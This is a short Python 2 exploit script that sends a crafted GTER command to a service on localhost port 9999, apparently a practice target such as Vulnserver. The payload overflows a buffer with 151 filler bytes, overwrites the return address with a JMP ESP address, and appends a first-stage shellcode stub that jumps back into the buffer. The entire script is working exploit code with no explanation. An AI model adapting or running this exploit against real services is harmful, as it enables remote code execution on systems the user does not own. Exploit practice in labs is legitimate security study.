import socket
import struct
import os
import sys

vuln_command = "GTER "
crash = 160
offset = 151
eip = struct.pack("<I", 0x62501205)          # JMP ESP
jmp_back = "\x54\x59\x83\xE9\x64\xFF\xE1"    # 1st Stage Shellcode

payload = ""
payload += vuln_command
payload += "A" * 151
payload += eip
payload += jmp_back
payload += "C" * 20

print "[+] Sending buffer (Size: %d)" % len(payload)

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
s.connect(('127.0.0.1', 9999))
print(s.recv(1024))
s.send(payload)
s.close()
